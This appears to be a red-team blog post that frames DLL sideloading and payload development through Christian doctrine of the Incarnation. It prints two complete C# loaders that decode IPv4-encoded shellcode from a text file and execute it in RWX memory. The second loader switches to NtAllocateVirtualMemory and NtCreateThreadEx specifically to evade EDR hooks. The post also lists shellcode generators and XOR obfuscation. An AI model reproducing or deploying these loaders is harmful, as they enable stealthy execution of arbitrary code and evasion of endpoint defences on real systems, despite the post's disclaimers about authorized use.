---
title: "Loader Crafting and the Incarnate DLL"
date: 2025-10-01
categories: [Red-Team, Malware, EDR-Evasion, Theology]
tags: [Dll Sideloading, EDR, Cobalt Strike, Red Team, Theology, Malware]
---
>
> ⚠️ The infrastructure, code, and methodologies described in this blog are designed **solely for lawful, educational, and ethical purposes**. This series is intended to help red team professionals, security researchers, and students build controlled environments for testing, training, and strengthening defensive postures.
>
> As those made in the image of God and called to walk in integrity, we affirm that knowledge must be governed by wisdom. The Apostle Paul reminds us, _“All things are lawful, but not all things are helpful”_ (1 Cor. 10:23). Accordingly, these tools are not to be used for harm, unauthorized access, or malicious activity of any kind.
>
> Let it be clear: **this work is to be conducted with a clear conscience before both God and man** (Acts 24:16). Those who weaponize such knowledge outside the bounds of legality and virtue not only violate human law, but grieve the moral law of the Creator Himself.
>
> _“Whatever you do, in word or deed, do everything in the name of the Lord Jesus...”_
>
> — **Colossians 3:17**
---

> *“And the Word became flesh and dwelt among us.” — John 1:14*

---
>
>🚧 Apologies up front. This blog will be longer than our usual posts, as this will contian detailed scripts and documentation for payload development in order to help Red Team Security Engineers in there up-coming assessments.
>

---

## Payload Design and the Mystery of Two Natures  

At the Council of Nicaea (see my [blog](https://www.nicenesecurity.com/_posts/2025-09-15-The-Anniversary-of-Nicaea) celebrating the 1700th Anniversary), the church confessed the mystery of Christ: He is **fully God and fully man**, two natures united in one person, without confusion or division.  

This dual nature offers a powerful metaphor for payload design:  

- **Divine Nature (Eternal Word)**: Payloads crafted ahead of time, independent of their environment — waiting to be revealed.  
- **Human Nature (Word Made Flesh)**: Payloads crafted in response to reconnaissance, entering the “flesh” of a vulnerable DLL.  

Like Christ Himself, the loader appears ordinary — forwarding exports and behaving like any other DLL. Yet hidden within is another nature, unseen and powerful, waiting for the moment of execution.  

---

## II. Recon and Path Identification: The Word Made Flesh  

The incarnation was not abstract. The Son entered history in a particular time and place. Similarly, payloads must inhabit the actual conditions of the system — its vulnerable paths and misplaced trust.  

In this phase, we search for **trusted executables that expose assumptions**. Our task is not to impose a payload from above, but to enter what is already broken.  

### 🔎 Step 1: Find a Viable Sideloading Path with Assembly Hunter  

The first move is reconnaissance — locating a **signed executable** that trusts DLLs in its local directory. For this, we use [Assembly Hunter](https://github.com/mgeeky/AssemblyHunter).  

Assembly Hunter scans directories for:  

- Digitally signed executables (often required for trusted execution)  
- DLL import lists, exposing dependencies  
- Missing or phantom DLLs, revealing hijack potential  
- Load order assumptions, like directory-based loading  

This tool acts as your **revelation mechanism** — it uncovers the misplaced trust of the system.  

---

### 🛠️ Step 2: Analyze the Execution Path  

Once a candidate is identified:  

- Use **Procmon** to monitor runtime DLL behavior:  

  - `NAME NOT FOUND` → phantom DLLs  
  - `PATH NOT FOUND` → vulnerable search paths  
  - `LOAD IMAGE` → confirmed execution  

- Use **ILSpy or dnSpy** to inspect the binary:  

  - Static constructors (`.cctor`)  
  - P/Invoke calls (`DllImport`, `LoadLibrary`, `GetProcAddress`)  
  - UI initialization methods  

Here, discernment matters. Not every path is viable. You must find one that can bear both “natures” of the loader without crashing the host.  

---

## III. Theological Reflection: The Incarnation of the Payload  

Like the Son taking on flesh, the loader assumes the **form** of the vulnerable DLL. It appears ordinary, accepted by the system, and yet within it resides a hidden power.  

- **The Father** reveals the broken trust.  
- **The Son** assumes the form of the trusted DLL.  
- **The Spirit** executes unseen, persisting until its purpose is revealed.  

We don’t enter to corrupt. We enter to **expose misplaced trust**.  

---

## IV. The Eternal Word: Payloads Built in Advance  

In some operations, we don’t wait for reconnaissance. We preemptively craft **modular loaders** — flexible, environment-agnostic, waiting for the right time to be revealed.  

- Export-neutral DLLs with no assumptions about environment  
- Modular payload handlers (read shellcode from external files)  
- Multiple execution methods (`CreateThread`, `APC`, `NtCreateThreadEx`)  
- Minimal artifacts for stealth  

This is like the **preexistent Logos**: the Word that was “in the beginning” (John 1:1), already prepared before entering history. Such loaders don’t always fit, but when they do, deployment is immediate.  

---

## V. Deployment: Two Natures in One Loader  

Once a viable path is identified, the task is to design the payload so that both “natures” are preserved:  

- **Human side**: Forward exports, maintain application stability  
- **Divine side**: Execute obfuscated shellcode without detection  

A simple proof of concept begins with a MessageBox injection — confirming that the system accepts your presence. From there, you refine toward obfuscated shellcode and stealthy execution. Below is a sample of .NET Assembly that was used to execute a MessageBox. 

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace XXXXXX.Diagnostics.Audit
{
    public static partial class EventLogger
    {
        static EventLogger()
        {
            try
            {
                MessageBox.Show("Triggering shellcode from Shellcode.txt", "DEBUG");

                string basePath = "C:\\Users\\Users\\Desktop\\Payload\\";
                string filenamePath = Path.Combine(basePath, "Shellcode.txt");

                if (File.Exists(filenamePath))
                {
                    ExecuteShellcodeFromFile(filenamePath);
                }
                else
                {
                    MessageBox.Show("ips.txt not found!", "DEBUG");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}", "DEBUG");
            }
        }

        private static void ExecuteShellcodeFromFile(string filename)
        {
            try
            {
                string[] lines = File.ReadAllLines(filename);
                List<byte> shellcode = new List<byte>();

                foreach (var line in lines)
                {
                    string[] parts = line.Split('.');
                    if (parts.Length == 4)
                    {
                        shellcode.AddRange(parts.Select(byte.Parse));
                    }
                }

                IntPtr allocMem = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Count, 0x3000, 0x40);
                Marshal.Copy(shellcode.ToArray(), 0, allocMem, shellcode.Count);

                IntPtr thread = CreateThread(IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Execution Error: {ex.Message}", "DEBUG");
            }
        }

        // Import Windows API functions
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    }
}
```
## VI. Shellcode Generation and Obfuscation

After injection is proven, shift to the real payload.

**Shellcode generation tools:**

- Cobalt Strike  
- MSFVenom  
- Donut

**Encoding Techniques:**

- XOR (with static or rolling key)  
- IPv4 encoding (e.g., 192.168.10.32 format)  
- Base64 or zlib compression

This is **the Spirit at work** — your code remains unseen, but present, waiting for the appointed moment. For this particular discussion, the team developed a python script using some techniques picked up from [Malware Development Academy](https://maldevacademy.com/), where raw shallcode (```.bin```) is converted to IPv4 addresses. In addition, the team also modified the output by encrypting the shellcode with an XOR Key. All-in-all this creates an shellcode that looks like a list of IPv4 addresses in a ```.txt``` file.

With our shellcode now properly obfuscated and encrypted. We can moved on to additional testing and development. 

---

## VII. Stealthy Execution: From Windows APIs to Syscalls

Once shellcode is generated and encoded, execution becomes the next battleground — and **EDRs watch closely**.

Classic API calls like `VirtualAlloc`, `WriteProcessMemory`, and `CreateThread` are **heavily monitored**. If you use them as-is, you will trigger detections.

This is where we pivot to **low-level syscalls** — techniques that mimic native OS behavior without ringing the EDR alarm bells.

### Classic API Pattern (High-Risk)

```
csharp
IntPtr addr = VirtualAlloc(IntPtr.Zero, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
Marshal.Copy(shellcode, 0, addr, shellcode.Length);
CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, out threadId);
```

---

### Improved Tactics: Nt Syscalls

These Win32 APIs are well-known and monitored through userland hooks. Your payload becomes loud, even if encoded.

Instead, use native syscall wrappers:

- NtAllocateVirtualMemory0
- NtWriteVirtualMemory0
- NtCreateThreadEx

These provide more stealth by bypassing userland hooks and calling directly into ntdll.dll functions.

Example strategy:

- Decrypt your shellcode in memory
- Allocate memory via NtAllocateVirtualMemory
- Copy with RtlMoveMemory
- Execute with NtCreateThreadEx

Sleep or delay execution to avoid behavioral triggers. In our case, we change our ```initial message box with callback.cs``` and stop using ```VritualAllocCreateThread```. 

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace XXXXXX.Diagnostics.Audit
{
    public static partial class EventLogger
    {
        static EventLogger()
        {
            try
            {
                // Get the directory where the DLL is running
                string dllPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                string basePath = Path.GetDirectoryName(dllPath);
                string filenamePath = Path.Combine(basePath, "Shellcode.txt");

                MessageBox.Show($"Triggering shellcode from: {filenamePath}", "DEBUG");

                if (File.Exists(filenamePath))
                {
                    ExecuteShellcodeFromFile(filenamePath);
                }
                else
                {
                    MessageBox.Show("Shellcode.txt not found!", "DEBUG");
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}", "DEBUG");
            }
        }

        private static void ExecuteShellcodeFromFile(string filename)
        {
            try
            {
                string[] lines = File.ReadAllLines(filename);
                List<byte> shellcode = new List<byte>();

                foreach (var line in lines)
                {
                    string[] parts = line.Split('.');
                    if (parts.Length == 4)
                    {
                        shellcode.AddRange(parts.Select(byte.Parse));
                    }
                }

                // Stealthy Memory Allocation
                IntPtr pMemory = IntPtr.Zero;
                UIntPtr size = (UIntPtr)shellcode.Count;
                uint ntstatus = NtAllocateVirtualMemory(
                    (IntPtr)(-1), 
                    ref pMemory, 
                    IntPtr.Zero, 
                    ref size, 
                    0x3000, 
                    0x40
                );

                if (ntstatus != 0 || pMemory == IntPtr.Zero)
                    return;  // Memory allocation failed

                Marshal.Copy(shellcode.ToArray(), 0, pMemory, shellcode.Count);

                // Stealthy Shellcode Execution
                IntPtr hThread = IntPtr.Zero;
                ntstatus = NtCreateThreadEx(
                    out hThread, 
                    0x1FFFFF, 
                    IntPtr.Zero, 
                    (IntPtr)(-1), 
                    pMemory, 
                    IntPtr.Zero, 
                    false, 
                    0, 
                    0x1000, 
                    0x100000, 
                    IntPtr.Zero
                );

                if (ntstatus != 0 || hThread == IntPtr.Zero)
                    return;  // Thread creation failed
            }
            catch (Exception ex)
            {
                // Logging removed for stealth
            }
        }

        // Import stealthy Windows API functions
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtAllocateVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            ref UIntPtr RegionSize,
            uint AllocationType,
            uint Protect
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtCreateThreadEx(
            out IntPtr threadHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            uint stackZeroBits,
            uint sizeOfStackCommit,
            uint sizeOfStackReserve,
            IntPtr bytesBuffer
        );
    }
}
```
---

## VI. Obfuscation and Stealth: Hidden Glory  

Just as Christ’s glory was veiled in human flesh, so the payload must veil its true nature through obfuscation:  

- **Encoding**: IPv4 representation, Base64, zlib compression  
- **Encryption**: XOR or rolling keys  
- **Stealth Execution**: NtAllocateVirtualMemory, NtCreateThreadEx, APC injection  

The system sees only a benign DLL. But hidden within, the payload waits — ready to reveal itself at the appointed time.  

---

## VIII. Putting It All Together: Doctrine Meets Deployment  

The mystery of the incarnation helps us frame payload development:  

1. **Reconnaissance (The Father)**  
   - Reveal misplaced trust in signed executables  
2. **Loader Design (The Son)**  
   - Assume the form of the vulnerable DLL  
   - Maintain legitimacy while carrying hidden execution  
3. **Shellcode Execution (The Spirit)**  
   - Operate unseen until the appointed moment  
   - Work silently within, bypassing detection  

![The Trinity](https://www.nicenesecurity.com/assets/img/Trinity.png)

Like Christ, the loader is both ordinary and extraordinary — two natures, one operation.  

---

## IX. Conclusion: Incarnation as a Model of Precision  

Payload development is not brute force. It is precision, discipline, and discernment.  

The incarnate loader enters the system not to destroy but to disclose. It bears two natures: one that defenders can see and trust, another that executes unseen to reveal misplaced confidence.  

> *“In your light do we see light.” — Psalm 36:9*  

To craft such tools with integrity is to imitate the mystery of the incarnation — entering what is broken, not recklessly, but redemptively.  

---

## Disclaimer  

This post is for **authorized red team operations** only.  
All methods are rooted in ethical testing and theological clarity.  

> **To outpace the watchers is not to destroy, but to disclose. Not to deceive, but to discern.**

---

**AthanasiusXOR**  
**Contra Mundum. Code Obscurum.**
